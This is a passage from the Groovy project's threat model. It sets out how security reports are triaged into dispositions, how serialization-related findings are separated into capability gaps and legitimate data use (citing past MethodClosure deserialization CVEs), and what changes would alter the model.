| a **PoC the model's adversary cannot stage** ([§7](#7-adversary-model)) | the capability is within the [§7](#7-adversary-model) closed list |

A finding that clears the right-hand bar is a real candidate; everything
else is closed with a one-line pointer to the cited section. **When a
finding is genuinely ambiguous, do not silently drop it — surface it as
`MODEL-GAP`** so a human decides.

### 11c. Serialization hardening — capability vs. data

This rule is *(maintainer)*. Deserializing untrusted bytes is the application's risk
([§3](#3-out-of-scope-explicit-non-goals)) and no per-class change makes it
safe; *within* that baseline, this is how serialization-related findings are
dispositioned. The test is **capability vs. data** — harden surprising
capability gaps without stopping users doing legitimate serialization:

| Bucket | A finding where… | Disposition |
|---|---|---|
| **Capability primitive** | a deserialization path grants a *capability* beyond reconstructing declared state — method dispatch, class-resolution-by-name, proxy invocation, code execution — **and** gating it would not break a "restore my data" use | **`VALID-HARDENING`** — gate it. Precedent: the `MethodClosure` RCE fixes (CVE-2015-3253, CVE-2016-6814) gated the resolve path behind `MethodClosure.ALLOW_RESOLVE` (default `false`, throwing on deserialize) rather than removing `Serializable` — capability closed, data path intact. |
| **Legitimate data serialization** | round-tripping the declared state of POGOs, value types (ranges, tuples, `GString`), or *deliberate* closure serialization across a **trusted** boundary (distributed-compute / caching, both ends owned by the developer) | **Not a finding — do not break.** A blanket "remove `Serializable` from `Closure`" is too blunt. If closures are ever hardened, prefer opt-in or transient-by-default for the ambient-capture fields (`owner`/`thisObject`/`delegate`, today non-transient) with a documented rehydration path — an implementation choice, not a scope question. |
| **Arbitrary graph, no named primitive** | DoS or RCE composed from an arbitrary object graph *without* identifying a specific capability primitive to remove | **`OUT-OF-MODEL: untrusted-deserialization`.** Per-class hardening is whack-a-mole ("one more wrapper in between and it works again"). |

The hinge is bucket 1 vs. 3: *does the report name a capability primitive to
gate, or merely exploit that object graphs deserialize?* Only the former
carries a hardening obligation.

---

## 12. Conditions that would change this model

- Groovy shipping an officially-supported sandbox / isolation boundary
  (would create new in-model properties and bypass-handling rules).
- A data parser (`JsonSlurper`, YAML/TOML/CSV, XML) gaining a
  polymorphic / default-typing mode that instantiates document-chosen
  classes (would create a deserialization surface that *is* in model).
- Changing the secure-by-default XML posture (P2) or temp-artifact
  permissions (P4).
- A new tool or subproject that accepts input over the network as a
  service (would introduce a remote network adversary the current model
  does not have).
- Hardening of serializable runtime types (e.g. making closure fields
  transient, or removing `Serializable`) — would move some [§11a](#11a-known-non-findings-recurring-false-positives)
  items into scope as defense-in-depth.

---

## 13. Triage dispositions

Every report should resolve to exactly one:

| Disposition | Meaning | Handling |
|---|---|---|
| **VALID** | Violates a provided property ([§8](#8-security-properties-the-project-provides)) in a default configuration | Private report per [`SECURITY.md`](.github/SECURITY.md); fix + advisory |
| **VALID-HARDENING** | By design and not a CVE, but we choose to improve secure-by-default behavior anyway — whether as defense-in-depth on a reported issue or as a proactive hardening we recognize as good practice | Handled in the open, normal-priority; not embargoed |
| **OUT-OF-MODEL: executes-supplied-code** | Relies on the app compiling/evaluating attacker-influenced code or templates | Close citing [§3](#3-out-of-scope-explicit-non-goals) |
| **OUT-OF-MODEL: untrusted-deserialization** | Relies on the app deserializing attacker-controlled bytes | Close citing [§3](#3-out-of-scope-explicit-non-goals)/[§11](#11-known-misuse-patterns) |
| **OUT-OF-MODEL: trusted-input** | Relies on attacker control of classpath, config, AST transforms, or `groovy.*` properties | Close citing [§3](#3-out-of-scope-explicit-non-goals) |
| **OUT-OF-MODEL: downstream-responsibility** | App-built SQL/command/URL/path from untrusted input | Close citing [§10](#10-downstream-responsibilities) |
| **OUT-OF-MODEL: equivalent-harm** | A new path to an effect the actor could already reach legitimately ([§3](#3-out-of-scope-explicit-non-goals)) | Close citing [§3](#3-out-of-scope-explicit-non-goals) |
| **OUT-OF-MODEL: adversary-not-in-scope** | Requires a capability outside the [§7](#7-adversary-model) closed list (e.g. an already-privileged actor, or supply-chain tampering) | Close citing [§7](#7-adversary-model) |
| **BY-DESIGN: property-disclaimed** | Targets a [§9](#9-security-properties-the-project-does-not-provide) non-property (e.g. `SecureASTCustomizer` bypass) | Close citing [§9](#9-security-properties-the-project-does-not-provide) |
| **KNOWN-NON-FINDING** | Matches [§11a](#11a-known-non-findings-recurring-false-positives) | Close citing the row |
| **MODEL-GAP** | A legitimate in-model scenario this document doesn't yet cover | Update this model, then re-triage |

A `VALID` (or `VALID-HARDENING`) finding confined to `@Incubating` APIs or
pre-release builds keeps its disposition but is handled at reduced priority
per the stability qualifier in [§8](#8-security-properties-the-project-provides) — best-effort, not embargoed.

**Batched scan reports.** An automated code-scan typically arrives as a
*single* document bundling many candidate findings — a departure from the
usual ASF "one email, one issue" flow. Each candidate is assigned exactly
one disposition from the table above. Only `VALID` and `VALID-HARDENING`
items enter the coordinated flow in [`SECURITY.md`](.github/SECURITY.md),
and of those only `VALID` items are embargo-sensitive (`VALID-HARDENING`
can be handled in the open); every other disposition is closed in-batch
with a pointer to its cited section and does **not** become an advisory.
This lets a large scan be triaged as a table of dispositions without
flooding the security process, and keeps the private channel reserved for
the few findings that warrant it.

---

## 14. Machine-readable companion

A structured sidecar, [`threat-model.yaml`](threat-model.yaml),
enumerates the properties ([§8](#8-security-properties-the-project-provides)),
dispositions ([§13](#13-triage-dispositions)), and known non-findings
([§11a](#11a-known-non-findings-recurring-false-positives)) so
scanning/triage tooling can auto-classify findings. Every YAML entry
carries the matching section anchor. This Markdown document remains
authoritative; the YAML mirrors it.

---

## Appendix A — back-map: existing documentation → threat-model section

| Existing source | Covers |
|---|---|
| [`.github/SECURITY.md`](.github/SECURITY.md) — supported versions, reporting, disclosure hygiene | [§8 P5](#8-security-properties-the-project-provides), [§13](#13-triage-dispositions) |
| [groovy-lang.org/security.html](https://groovy-lang.org/security.html) — CVE history (CVE-2015-3253, CVE-2016-6814 deserialization; CVE-2020-17521 temp perms) | [§3](#3-out-of-scope-explicit-non-goals), [§8 P4](#8-security-properties-the-project-provides), [§11](#11-known-misuse-patterns) |
| [`AGENTS.md`](AGENTS.md) — "Untrusted input and confirmation"; Grape off by default for tooling | [§3](#3-out-of-scope-explicit-non-goals), [§5a](#5a-build-time--configuration-knobs-that-affect-this-model), [§10](#10-downstream-responsibilities) |
| `SecureASTCustomizer` javadoc — "isn't intended to be the complete solution of all security issues" | [§9](#9-security-properties-the-project-does-not-provide) false friends |
| `groovy.xml.FactorySupport` javadoc — secure processing, disallow-doctype, external-entity defaults | [§8 P2](#8-security-properties-the-project-provides) |
| `groovy.sql.Sql` GString → `PreparedStatement` behaviour | [§8 P1](#8-security-properties-the-project-provides) |
